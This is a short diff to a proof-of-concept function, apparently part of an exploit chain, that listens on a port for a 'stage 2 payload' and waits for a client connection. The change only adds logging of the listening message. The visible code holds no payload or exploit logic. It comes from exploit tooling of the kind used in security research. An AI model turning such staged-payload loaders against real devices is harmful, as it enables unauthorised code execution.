@@ -119,9 +119,13 @@ def poc():
     ip = sc.get_current_ip()
 
     if ip is None:
-        sc.send_notification("Listening on port %d for stage 2 payload..." % port)
+        msg = "Listening on port %d for stage 2 payload..." % port
+        sc.send_notification(msg)
+        log(msg)
     else:
-        sc.send_notification("Listening on %s:%d for stage 2 payload..." % (ip, port))
+        msg = "Listening on %s:%d for stage 2 payload..." % (ip, port)
+        sc.send_notification(msg)
+        log(msg)
     while True:
         log("Waiting for client connection...")
         client_sock = u64_to_i64(
